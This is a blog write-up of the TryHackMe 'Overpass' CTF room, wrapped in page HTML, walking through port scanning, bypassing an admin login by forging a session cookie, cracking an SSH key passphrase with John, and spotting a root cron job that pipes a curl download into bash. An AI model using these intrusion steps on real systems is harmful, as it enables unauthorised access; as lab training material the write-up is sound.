@@ -1,0 +1,839 @@
+<!DOCTYPE html>
+<html>
+<head>
+
+    <!-- Document Settings -->
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+
+    <!-- Base Meta -->
+    <!-- dynamically fixing the title for tag/author pages -->
+
+
+
+    <title>Overpass Write Up</title>
+    <meta name="HandheldFriendly" content="True" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <!-- Styles'n'Scripts -->
+    <link rel="stylesheet" type="text/css" href="/assets/built/screen.css" />
+    <link rel="stylesheet" type="text/css" href="/assets/built/screen.edited.css" />
+    <link rel="stylesheet" type="text/css" href="/assets/built/syntax.css" />
+    <!-- highlight.js -->
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/default.min.css">
+    <style>.hljs { background: none; }</style>
+
+    <!--[if IE]>
+        <style>
+            p, ol, ul{
+                width: 100%;
+            }
+            blockquote{
+                width: 100%;
+            }
+        </style>
+    <![endif]-->
+    
+    <!-- This tag outputs SEO meta+structured data and other important settings -->
+    <meta name="description" content="Infosec | Hacking | CTF" />
+    <link rel="shortcut icon" href="https://darrynbrownfield.co.uk/assets/images/favicon.png" type="image/png" />
+    <link rel="canonical" href="https://darrynbrownfield.co.uk/overpass" />
+    <meta name="referrer" content="no-referrer-when-downgrade" />
+
+     <!--title below is coming from _includes/dynamic_title-->
+    <meta property="og:site_name" content="Darryn Brownfield" />
+    <meta property="og:type" content="website" />
+    <meta property="og:title" content="Overpass Write Up" />
+    <meta property="og:description" content="Overview Overpass is an easy room from TryHackMe with the description: What happens when a group of broke Computer Science students try to make a password manager? Obviously a perfect commercial success! The room is part of the Overpass series, over the next few weeks I plan to provide a" />
+    <meta property="og:url" content="https://darrynbrownfield.co.uk/overpass" />
+    <meta property="og:image" content="https://darrynbrownfield.co.uk/assets/images/overpass/cover.png" />
+    <meta property="article:publisher" content="https://www.facebook.com/" />
+    <meta property="article:author" content="https://www.facebook.com/" />
+    <meta property="article:published_time" content="2020-09-12T00:00:00+00:00" />
+    <meta property="article:modified_time" content="2020-09-12T00:00:00+00:00" />
+    <meta property="article:tag" content="Tryhackme" />
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:title" content="Overpass Write Up" />
+    <meta name="twitter:description" content="Overview Overpass is an easy room from TryHackMe with the description: What happens when a group of broke Computer Science students try to make a password manager? Obviously a perfect commercial success! The room is part of the Overpass series, over the next few weeks I plan to provide a" />
+    <meta name="twitter:url" content="https://darrynbrownfield.co.uk/" />
+    <meta name="twitter:image" content="https://darrynbrownfield.co.uk/assets/images/overpass/cover.png" />
+    <meta name="twitter:label1" content="Written by" />
+    <meta name="twitter:data1" content="Darryn Brownfield" />
+    <meta name="twitter:label2" content="Filed under" />
+    <meta name="twitter:data2" content="Tryhackme" />
+    <meta name="twitter:site" content="@dazbrownfield" />
+    <meta name="twitter:creator" content="@dazbrownfield" />
+    <meta property="og:image:width" content="1400" />
+    <meta property="og:image:height" content="933" />
+
+    <script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "Website",
+    "publisher": {
+        "@type": "Organization",
+        "name": "Darryn Brownfield",
+        "logo": "https://darrynbrownfield.co.uk/assets/images/blog-icon.png"
+    },
+    "url": "https://darrynbrownfield.co.uk/overpass",
+    "image": {
+        "@type": "ImageObject",
+        "url": "https://darrynbrownfield.co.uk/assets/images/overpass/cover.png",
+        "width": 2000,
+        "height": 666
+    },
+    "mainEntityOfPage": {
+        "@type": "WebPage",
+        "@id": "https://darrynbrownfield.co.uk/overpass"
+    },
+    "description": "Overview Overpass is an easy room from TryHackMe with the description: What happens when a group of broke Computer Science students try to make a password manager? Obviously a perfect commercial success! The room is part of the Overpass series, over the next few weeks I plan to provide a"
+}
+    </script>
+
+    <!-- <script type="text/javascript" src="https://demo.ghost.io/public/ghost-sdk.min.js?v=724281a32e"></script>
+    <script type="text/javascript">
+    ghost.init({
+    	clientId: "ghost-frontend",
+    	clientSecret: "f84a07a72b17"
+    });
+    </script> -->
+
+    <meta name="generator" content="Jekyll 3.6.2" />
+    <link rel="alternate" type="application/rss+xml" title="Overpass Write Up" href="/feed.xml" />
+
+
+</head>
+<body class="post-template">
+
+    <div class="site-wrapper">
+        <!-- All the main content gets inserted here, index.hbs, post.hbs, etc -->
+        <!-- default -->
+
+<!-- The tag above means: insert everything in this file
+into the {body} of the default.hbs template -->
+
+<header class="site-header outer">
+    <div class="inner">
+        <nav class="site-nav">
+    <div class="site-nav-left">
+        
+            
+
+            
+        
+        
+            <ul class="nav" role="menu">
+    <li class="nav-home" role="menuitem"><a href="/">Home</a></li>
+    <li class="nav-about" role="menuitem"><a href="/about/">About</a></li>
+    <li class="nav-getting-started" role="menuitem"><a href="/tag/ctf/">CTF</a></li>
+</ul>
+
+        
+    </div>
+    <div class="site-nav-right">
+        <div class="social-links">
+            
+            <a
+              class="social-link social-link-tw"
+              href="https://github.com/darrynb89"
+              target="_blank"
+              rel="noopener"
+              ><svg
+  version="1.0"
+  xmlns="http://www.w3.org/2000/svg"
+  viewBox="0 0 120.000000 120.000000"
+>
+  <g
+    transform="translate(0.000000,120.000000) scale(0.0900000,-0.0900000)"
+    fill="#ffffff"
+    stroke="none"
+  >
+    <path
+      d="M441 1174 c-105 -28 -181 -73 -266 -159 -125 -124 -175 -246 -175
+-425 0 -179 50 -300 175 -425 85 -85 185 -145 243 -145 36 0 42 13 42 89 l0
+57 -57 -3 c-74 -5 -117 17 -150 78 -13 24 -37 56 -54 71 -34 33 -36 38 -9 38
+12 0 20 -7 20 -16 0 -10 6 -14 14 -11 10 4 13 1 9 -9 -3 -10 2 -14 18 -14 18
+0 20 -3 10 -9 -16 -11 -4 -34 14 -27 9 3 11 -2 7 -16 -4 -18 -2 -20 21 -14 20
+5 25 3 21 -8 -9 -23 17 -31 33 -11 12 17 13 17 13 2 0 -11 8 -17 21 -17 15 0
+19 5 15 15 -3 8 -1 15 4 15 6 0 10 -7 10 -15 0 -8 7 -15 15 -15 8 0 15 8 15
+18 0 10 10 39 23 64 l23 46 -59 13 c-136 28 -210 123 -211 268 -1 66 3 82 27
+124 23 39 27 55 22 86 -7 40 9 121 24 121 18 0 78 -25 113 -46 30 -19 42 -22
+70 -14 18 6 71 10 118 10 47 0 100 -4 118 -10 28 -8 40 -5 70 14 35 21 95 46
+113 46 15 0 31 -81 24 -121 -5 -31 -1 -47 22 -86 24 -42 28 -58 27 -123 -1
+-147 -65 -231 -203 -266 l-68 -18 18 -30 c15 -25 19 -51 19 -138 0 -58 3 -113
+6 -122 20 -52 166 16 279 129 125 125 175 246 175 425 0 179 -50 301 -175 425
+-86 87 -161 131 -270 160 -75 19 -241 19 -314 -1z"
+    />
+  </g>
+</svg></a
+            >
+            
+            <a
+              class="social-link social-link-li"
+              href="https://www.linkedin.com/in/darryn-brownfield-0b1132b5"
+              target="_blank"
+              rel="noopener"
+              ><svg viewBox="0 50 512 512">
+    <g transform="translate(0.000000,20.000000) scale(1.1)">
+      <path
+        d="M150.65,100.682c0,27.992-22.508,50.683-50.273,50.683c-27.765,0-50.273-22.691-50.273-50.683
+      C50.104,72.691,72.612,50,100.377,50C128.143,50,150.65,72.691,150.65,100.682z M143.294,187.333H58.277V462h85.017V187.333z
+      M279.195,187.333h-81.541V462h81.541c0,0,0-101.877,0-144.181c0-38.624,17.779-61.615,51.807-61.615
+      c31.268,0,46.289,22.071,46.289,61.615c0,39.545,0,144.181,0,144.181h84.605c0,0,0-100.344,0-173.915
+      s-41.689-109.131-99.934-109.131s-82.768,45.369-82.768,45.369V187.333z"
+      />
+    </g>
+  </svg></a
+            >
+             
+            <a
+              class="social-link social-link-tw"
+              href="https://twitter.com/dazbrownfield"
+              target="_blank"
+              rel="noopener"
+              ><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><path d="M30.063 7.313c-.813 1.125-1.75 2.125-2.875 2.938v.75c0 1.563-.188 3.125-.688 4.625a15.088 15.088 0 0 1-2.063 4.438c-.875 1.438-2 2.688-3.25 3.813a15.015 15.015 0 0 1-4.625 2.563c-1.813.688-3.75 1-5.75 1-3.25 0-6.188-.875-8.875-2.625.438.063.875.125 1.375.125 2.688 0 5.063-.875 7.188-2.5-1.25 0-2.375-.375-3.375-1.125s-1.688-1.688-2.063-2.875c.438.063.813.125 1.125.125.5 0 1-.063 1.5-.25-1.313-.25-2.438-.938-3.313-1.938a5.673 5.673 0 0 1-1.313-3.688v-.063c.813.438 1.688.688 2.625.688a5.228 5.228 0 0 1-1.875-2c-.5-.875-.688-1.813-.688-2.75 0-1.063.25-2.063.75-2.938 1.438 1.75 3.188 3.188 5.25 4.25s4.313 1.688 6.688 1.813a5.579 5.579 0 0 1 1.5-5.438c1.125-1.125 2.5-1.688 4.125-1.688s3.063.625 4.188 1.813a11.48 11.48 0 0 0 3.688-1.375c-.438 1.375-1.313 2.438-2.563 3.188 1.125-.125 2.188-.438 3.313-.875z"/></svg>
+</a
+            >
+             
+          </div>
+</nav>
+
+    </div>
+</header>
+
+<!-- Everything inside the #post tags pulls data from the post -->
+<!-- #post -->
+
+<main id="site-main" class="site-main outer" role="main">
+    <div class="inner">
+
+        <article class="post-full  tag-tryhackme tag-ctf post ">
+
+            <header class="post-full-header">
+                <section class="post-full-meta">
+                    <time class="post-full-meta-date" datetime="12 September 2020">12 September 2020</time>
+                    
+                        <span class="date-divider">/</span>
+                        
+                            
+                               <a href='/tag/tryhackme/'>TRYHACKME</a>,
+                            
+                        
+                            
+                               <a href='/tag/ctf/'>CTF</a>
+                            
+                        
+                    
+                </section>
+                <h1 class="post-full-title">Overpass Write Up</h1>
+            </header>
+
+            <section class="post-full-content">
+                <div class="kg-card-markdown">
+                    <p><img src="/assets/images/overpass/cover.png" alt="GitHappens" /></p>
+
+<h3 id="overview">Overview</h3>
+
+<p>Overpass is an easy room from <a href="https://tryhackme.com">TryHackMe</a> with the description:</p>
+
+<blockquote>
+  <p>What happens when a group of broke Computer Science students try to make a password manager? 
+Obviously a perfect commercial success!</p>
+</blockquote>
+
+<p>The room is part of the Overpass series, over the next few weeks I plan to provide a write up for each series machine.</p>
+
+<p><img src="/assets/images/overpass/series.png" alt="THMSeries" /></p>
+
+<p>We have two tasks to complete, finding both the user and root flag. Typical CTF style room. Also a TryHackMe subscription code was hidden in the box, the first person to find and activate got a one month subscription for free. This has long been claimed however we will also find the code as part of the write up.</p>
+
+<h3 id="nmap">Nmap</h3>
+
+<p>TryHackMe will assign a dynamic IP as part of the deployment, the IP I will be targeting is ‘10.10.70.101’. I started by doing an nmap scan to check what ports are open.</p>
+
+<pre><code class="language-highlight">┌─[daz@parrot]─[~/Documents/TryHackMe/Overpass]
+└──╼ $sudo nmap -sC -sV -oA nmap/initial 10.10.70.101
+[sudo] password for daz: 
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-19 10:47 BST
+Nmap scan report for 10.10.70.101
+Host is up (0.039s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 37:96:85:98:d1:00:9c:14:63:d9:b0:34:75:b1:f9:57 (RSA)
+|   256 53:75:fa:c0:65:da:dd:b1:e8:dd:40:b8:f6:82:39:24 (ECDSA)
+|_  256 1c:4a:da:1f:36:54:6d:a6:c6:17:00:27:2e:67:75:9c (ED25519)
+80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
+|_http-title: Overpass
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 16.76 seconds
+</code></pre>
+
+<h3 id="enumeration">Enumeration</h3>
+
+<p>Only 2 ports open SSH and HTTP. I will start with HTTP as SSH as a smaller attack surface however the SSH banner does indicate its a Ubuntu machine. Also interestingly the HTTP banner is showing Golang net. Go is a open source programming language by Google.</p>
+
+<p>First I will take a look at the webpage.</p>
+
+<p><img src="/assets/images/overpass/homepage.png" alt="THMSeries" /></p>
+
+<p>Clicking around its a basic webpage for a secure password manager. On the ‘About Us’ page I found a list of usernames:</p>
+
+<ul>
+  <li>Ninja - Lead Developer</li>
+  <li>Pars - Shibe Enthusiast and Emotional Support Animal Manager</li>
+  <li>Szymex - Head Of Security</li>
+  <li>Bee - Chief Drinking Water Coordinator</li>
+  <li>MuirlandOracle - Cryptography Consultant</li>
+</ul>
+
+<p>These may be helpful later.</p>
+
+<p>Also a download page is available to download the software.</p>
+
+<p><img src="/assets/images/overpass/downloads.png" alt="Downloads" /></p>
+
+<p>Ive downloaded a copy of the Linux binary, the source code and the build script. Before I look at them I ran a gobuster on the webpages to check for any other directories.</p>
+
+<pre><code class="language-highlight">┌─[daz@parrot]─[~/Documents/TryHackMe/Overpass]                                                                
+└──╼ $gobuster dir -u http://10.10.70.101 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
+===============================================================                                                
+Gobuster v3.0.1                                                                                                
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)                                                
+===============================================================                                                
+[+] Url:            http://10.10.70.101                                                                        
+[+] Threads:        50                                                                                         
+[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt                               
+[+] Status codes:   200,204,301,302,307,401,403                                                                
+[+] User Agent:     gobuster/3.0.1                                                                             
+[+] Timeout:        10s                                                                                        
+===============================================================                                                
+2020/09/19 10:54:56 Starting gobuster                                                                          
+===============================================================                                                
+/img (Status: 301)                                                                                             
+/downloads (Status: 301)
+/aboutus (Status: 301)
+/admin (Status: 301)
+/css (Status: 301)
+</code></pre>
+
+<p>/admin is new. This brings me to a simple login page.</p>
+
+<p><img src="/assets/images/overpass/admin.png" alt="admin" /></p>
+
+<p>I tried various combinations of basic logins, admin/admin, admin/password etc but nothing worked. So I had a look at the source code for the admin page.</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!DOCTYPE html&gt;</span>
+<span class="nt">&lt;html&gt;</span>
+
+<span class="nt">&lt;head&gt;</span>
+    <span class="nt">&lt;meta</span> <span class="na">charset=</span><span class="s">"utf-8"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;meta</span> <span class="na">http-equiv=</span><span class="s">"X-UA-Compatible"</span> <span class="na">content=</span><span class="s">"IE=edge"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;title&gt;</span>Overpass<span class="nt">&lt;/title&gt;</span>
+    <span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">"viewport"</span> <span class="na">content=</span><span class="s">"width=device-width, initial-scale=1"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;link</span> <span class="na">rel=</span><span class="s">"stylesheet"</span> <span class="na">type=</span><span class="s">"text/css"</span> <span class="na">media=</span><span class="s">"screen"</span> <span class="na">href=</span><span class="s">"/css/main.css"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;link</span> <span class="na">rel=</span><span class="s">"stylesheet"</span> <span class="na">type=</span><span class="s">"text/css"</span> <span class="na">media=</span><span class="s">"screen"</span> <span class="na">href=</span><span class="s">"/css/login.css"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;link</span> <span class="na">rel=</span><span class="s">"icon"</span> <span class="na">type=</span><span class="s">"image/png"</span> <span class="na">href=</span><span class="s">"/img/overpass.png"</span> <span class="nt">/&gt;</span>
+    <span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"/main.js"</span><span class="nt">&gt;&lt;/script&gt;</span>
+    <span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"/login.js"</span><span class="nt">&gt;&lt;/script&gt;</span>
+    <span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"/cookie.js"</span><span class="nt">&gt;&lt;/script&gt;</span>
+<span class="nt">&lt;/head&gt;</span>
+
+<span class="nt">&lt;body</span> <span class="na">onload=</span><span class="s">"onLoad()"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;nav&gt;</span>
+        <span class="nt">&lt;img</span> <span class="na">class=</span><span class="s">"logo"</span> <span class="na">src=</span><span class="s">"/img/overpass.svg"</span> <span class="na">alt=</span><span class="s">"Overpass logo"</span><span class="nt">&gt;</span>
+        <span class="nt">&lt;h2</span> <span class="na">class=</span><span class="s">"navTitle"</span><span class="nt">&gt;&lt;a</span> <span class="na">href=</span><span class="s">"/"</span><span class="nt">&gt;</span>Overpass<span class="nt">&lt;/a&gt;&lt;/h2&gt;</span>
+        <span class="nt">&lt;a</span> <span class="na">class=</span><span class="s">"current"</span> <span class="na">href=</span><span class="s">"/aboutus"</span><span class="nt">&gt;</span>About Us<span class="nt">&lt;/a&gt;</span>
+        <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/downloads"</span><span class="nt">&gt;</span>Downloads<span class="nt">&lt;/a&gt;</span>
+    <span class="nt">&lt;/nav&gt;</span>
+    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"content"</span><span class="nt">&gt;</span>
+        <span class="nt">&lt;h1&gt;</span>Administrator area<span class="nt">&lt;/h1&gt;</span>
+        <span class="nt">&lt;p&gt;</span>Please log in to access this content<span class="nt">&lt;/p&gt;</span>
+        <span class="nt">&lt;div&gt;</span>
+            <span class="nt">&lt;h3</span> <span class="na">class=</span><span class="s">"formTitle"</span><span class="nt">&gt;</span>Overpass administrator login<span class="nt">&lt;/h1&gt;</span>
+        <span class="nt">&lt;/div&gt;</span>
+        <span class="nt">&lt;form</span> <span class="na">id=</span><span class="s">"loginForm"</span><span class="nt">&gt;</span>
+            <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"formElem"</span><span class="nt">&gt;&lt;label</span> <span class="na">for=</span><span class="s">"username"</span><span class="nt">&gt;</span>Username:<span class="nt">&lt;/label&gt;&lt;input</span> <span class="na">id=</span><span class="s">"username"</span> <span class="na">name=</span><span class="s">"username"</span> <span class="na">required</span><span class="nt">&gt;&lt;/div&gt;</span>
+            <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"formElem"</span><span class="nt">&gt;&lt;label</span> <span class="na">for=</span><span class="s">"password"</span><span class="nt">&gt;</span>Password:<span class="nt">&lt;/label&gt;&lt;input</span> <span class="na">id=</span><span class="s">"password"</span> <span class="na">name=</span><span class="s">"password"</span>
+                    <span class="na">type=</span><span class="s">"password"</span> <span class="na">required</span><span class="nt">&gt;&lt;/div&gt;</span>
+            <span class="nt">&lt;button&gt;</span>Login<span class="nt">&lt;/button&gt;</span>
+        <span class="nt">&lt;/form&gt;</span>
+        <span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"loginStatus"</span><span class="nt">&gt;&lt;/div&gt;</span>
+    <span class="nt">&lt;/div&gt;</span>
+<span class="nt">&lt;/body&gt;</span>
+
+<span class="nt">&lt;/html&gt;</span>
+</code></pre></div></div>
+
+<p>/login.js looks interesting.</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">async</span> <span class="kd">function</span> <span class="nx">postData</span><span class="p">(</span><span class="nx">url</span> <span class="o">=</span> <span class="s1">''</span><span class="p">,</span> <span class="nx">data</span> <span class="o">=</span> <span class="p">{})</span> <span class="p">{</span>
+    <span class="c1">// Default options are marked with *</span>
+    <span class="kd">const</span> <span class="nx">response</span> <span class="o">=</span> <span class="kr">await</span> <span class="nx">fetch</span><span class="p">(</span><span class="nx">url</span><span class="p">,</span> <span class="p">{</span>
+        <span class="na">method</span><span class="p">:</span> <span class="s1">'POST'</span><span class="p">,</span> <span class="c1">// *GET, POST, PUT, DELETE, etc.</span>
+        <span class="na">cache</span><span class="p">:</span> <span class="s1">'no-cache'</span><span class="p">,</span> <span class="c1">// *default, no-cache, reload, force-cache, only-if-cached</span>
+        <span class="na">credentials</span><span class="p">:</span> <span class="s1">'same-origin'</span><span class="p">,</span> <span class="c1">// include, *same-origin, omit</span>
+        <span class="na">headers</span><span class="p">:</span> <span class="p">{</span>
+            <span class="s1">'Content-Type'</span><span class="p">:</span> <span class="s1">'application/x-www-form-urlencoded'</span>
+        <span class="p">},</span>
+        <span class="na">redirect</span><span class="p">:</span> <span class="s1">'follow'</span><span class="p">,</span> <span class="c1">// manual, *follow, error</span>
+        <span class="na">referrerPolicy</span><span class="p">:</span> <span class="s1">'no-referrer'</span><span class="p">,</span> <span class="c1">// no-referrer, *client</span>
+        <span class="na">body</span><span class="p">:</span> <span class="nx">encodeFormData</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span> <span class="c1">// body data type must match "Content-Type" header</span>
+    <span class="p">});</span>
+    <span class="k">return</span> <span class="nx">response</span><span class="p">;</span> <span class="c1">// We don't always want JSON back</span>
+<span class="p">}</span>
+<span class="kd">const</span> <span class="nx">encodeFormData</span> <span class="o">=</span> <span class="p">(</span><span class="nx">data</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+    <span class="k">return</span> <span class="nb">Object</span><span class="p">.</span><span class="nx">keys</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span>
+        <span class="p">.</span><span class="nx">map</span><span class="p">(</span><span class="nx">key</span> <span class="o">=&gt;</span> <span class="nb">encodeURIComponent</span><span class="p">(</span><span class="nx">key</span><span class="p">)</span> <span class="o">+</span> <span class="s1">'='</span> <span class="o">+</span> <span class="nb">encodeURIComponent</span><span class="p">(</span><span class="nx">data</span><span class="p">[</span><span class="nx">key</span><span class="p">]))</span>
+        <span class="p">.</span><span class="nx">join</span><span class="p">(</span><span class="s1">'&amp;'</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="kd">function</span> <span class="nx">onLoad</span><span class="p">()</span> <span class="p">{</span>
+    <span class="nb">document</span><span class="p">.</span><span class="nx">querySelector</span><span class="p">(</span><span class="s2">"#loginForm"</span><span class="p">).</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s2">"submit"</span><span class="p">,</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">event</span><span class="p">)</span> <span class="p">{</span>
+        <span class="c1">//on pressing enter</span>
+        <span class="nx">event</span><span class="p">.</span><span class="nx">preventDefault</span><span class="p">()</span>
+        <span class="nx">login</span><span class="p">()</span>
+    <span class="p">});</span>
+<span class="p">}</span>
+<span class="k">async</span> <span class="kd">function</span> <span class="nx">login</span><span class="p">()</span> <span class="p">{</span>
+    <span class="kd">const</span> <span class="nx">usernameBox</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">querySelector</span><span class="p">(</span><span class="s2">"#username"</span><span class="p">);</span>
+    <span class="kd">const</span> <span class="nx">passwordBox</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">querySelector</span><span class="p">(</span><span class="s2">"#password"</span><span class="p">);</span>
+    <span class="kd">const</span> <span class="nx">loginStatus</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">querySelector</span><span class="p">(</span><span class="s2">"#loginStatus"</span><span class="p">);</span>
+    <span class="nx">loginStatus</span><span class="p">.</span><span class="nx">textContent</span> <span class="o">=</span> <span class="s2">""</span>
+    <span class="kd">const</span> <span class="nx">creds</span> <span class="o">=</span> <span class="p">{</span> <span class="na">username</span><span class="p">:</span> <span class="nx">usernameBox</span><span class="p">.</span><span class="nx">value</span><span class="p">,</span> <span class="na">password</span><span class="p">:</span> <span class="nx">passwordBox</span><span class="p">.</span><span class="nx">value</span> <span class="p">}</span>
+    <span class="kd">const</span> <span class="nx">response</span> <span class="o">=</span> <span class="kr">await</span> <span class="nx">postData</span><span class="p">(</span><span class="s2">"/api/login"</span><span class="p">,</span> <span class="nx">creds</span><span class="p">)</span>
+    <span class="kd">const</span> <span class="nx">statusOrCookie</span> <span class="o">=</span> <span class="kr">await</span> <span class="nx">response</span><span class="p">.</span><span class="nx">text</span><span class="p">()</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nx">statusOrCookie</span> <span class="o">===</span> <span class="s2">"Incorrect credentials"</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nx">loginStatus</span><span class="p">.</span><span class="nx">textContent</span> <span class="o">=</span> <span class="s2">"Incorrect Credentials"</span>
+        <span class="nx">passwordBox</span><span class="p">.</span><span class="nx">value</span><span class="o">=</span><span class="s2">""</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="nx">Cookies</span><span class="p">.</span><span class="kd">set</span><span class="p">(</span><span class="s2">"SessionToken"</span><span class="p">,</span><span class="nx">statusOrCookie</span><span class="p">)</span>
+        <span class="nb">window</span><span class="p">.</span><span class="nx">location</span> <span class="o">=</span> <span class="s2">"/admin"</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Looking at the login function it appears the script will send a post request to /api/login and wait for a response. If the response equals “Incorrect credentials” the text is displayed to the user and the password field is reset to blank. However if the response does not equal “Incorrect credentials” a cookie is set. I wonder if I can set the cooke to any value and it will allow me to log in?</p>
+
+<h3 id="foothold">Foothold</h3>
+
+<p>First I clear the data and cookies from my browser. Then using a cookie editor I add the session token with a random value.</p>
+
+<p><img src="/assets/images/overpass/cookie.png" alt="cookie" /></p>
+
+<p>Now when I refresh the page I’m logged in and find James’s SSH key.</p>
+
+<p><img src="/assets/images/overpass/key.png" alt="key" /></p>
+
+<p>The key is encrypted so if I try and use it to log in it wont work unless I provide a password. I can use John to first get the hash and then crack to get the password. I coped the key to a text file called ‘key’, than ran ssh2john to get the hash. Then used john to crack it.</p>
+
+<pre><code class="language-highlight">┌─[daz@parrot]─[~/Documents/TryHackMe/Overpass]
+└──╼ $/usr/share/john/ssh2john.py key &gt; hash
+┌─[daz@parrot]─[~/Documents/TryHackMe/Overpass]
+└──╼ $john --format=ssh hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
+Cost 2 (iteration count) is 1 for all loaded hashes
+Will run 2 OpenMP threads
+Note: This format may emit false positives, so it will keep trying even after
+finding a possible candidate.
+Proceeding with single, rules:Single
+Press 'q' or Ctrl-C to abort, almost any other key for status
+Warning: Only 2 candidates buffered for the current salt, minimum 8 needed for performance.
+Warning: Only 5 candidates buffered for the current salt, minimum 8 needed for performance.
+Warning: Only 4 candidates buffered for the current salt, minimum 8 needed for performance.
+Warning: Only 5 candidates buffered for the current salt, minimum 8 needed for performance.
+Warning: Only 2 candidates buffered for the current salt, minimum 8 needed for performance.
+Warning: Only 3 candidates buffered for the current salt, minimum 8 needed for performance.
+Warning: Only 5 candidates buffered for the current salt, minimum 8 needed for performance.
+Almost done: Processing the remaining buffered candidate passwords, if any.
+Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
+Proceeding with incremental:ASCII
+          (key)
+</code></pre>
+
+<p>Ive removed the password from the output but the password was cracked and I can now use that to log in. First I chmod 600 the key file so I can use it to log in.</p>
+
+<pre><code class="language-highlight">┌─[daz@parrot]─[~/Documents/TryHackMe/Overpass]
+└──╼ $chmod 600 key
+┌─[daz@parrot]─[~/Documents/TryHackMe/Overpass]
+└──╼ $ssh -i key james@10.10.70.101
+Enter passphrase for key 'key': 
+Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-108-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Sat Sep 19 10:39:34 UTC 2020
+
+  System load:  0.0                Processes:           88
+  Usage of /:   22.4% of 18.57GB   Users logged in:     0
+  Memory usage: 11%                IP address for eth0: 10.10.70.101
+  Swap usage:   0%
+
+
+47 packages can be updated.
+0 updates are security updates.
+
+
+Last login: Sat Jun 27 04:45:40 2020 from 192.168.170.1
+james@overpass-prod:~$ 
+</code></pre>
+
+<p>Im in! I can now grab the user.txt flag.</p>
+
+<pre><code class="language-highlight">james@overpass-prod:~$ ls
+todo.txt  user.txt
+james@overpass-prod:~$ cat user.txt
+thm{65c1aaf0005
+james@overpass-prod:~$ 
+</code></pre>
+
+<h3 id="priv-esc">Priv Esc</h3>
+
+<p>Now to get root, when I grabbed the user.txt file I noticed a todo.txt file.</p>
+
+<pre><code class="language-highlight">james@overpass-prod:~$ cat todo.txt 
+To Do:
+&gt; Update Overpass' Encryption, Muirland has been complaining that it's not strong enough
+&gt; Write down my password somewhere on a sticky note so that I don't forget it.
+  Wait, we make a password manager. Why don't I just use that?
+&gt; Test Overpass for macOS, it builds fine but I'm not sure it actually works
+&gt; Ask Paradox how he got the automated build script working and where the builds go.
+  They're not updating on the website
+james@overpass-prod:~$ 
+</code></pre>
+
+<p>I will also run <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite">linpeas</a> to see if anything jumps out.</p>
+
+<p>Scrolling through the output I find a cron job running every minute:</p>
+
+<pre><code class="language-highlight">* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
+</code></pre>
+
+<p>I doubt overpass.thm is a legitmate url so I checked the local host file.</p>
+
+<pre><code class="language-highlight">james@overpass-prod:~$ cat /etc/hosts
+127.0.0.1 localhost
+127.0.1.1 overpass-prod
+127.0.0.1 overpass.thm
+# The following lines are desirable for IPv6 capable hosts
+::1     ip6-localhost ip6-loopback
+fe00::0 ip6-localnet
+ff00::0 ip6-mcastprefix
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+james@overpass-prod:~$ 
+</code></pre>
+
+<p>So as root the cronjob is downloading the build script and piping it to bash. This looks to be our path to root if I can manipulate it.</p>
+
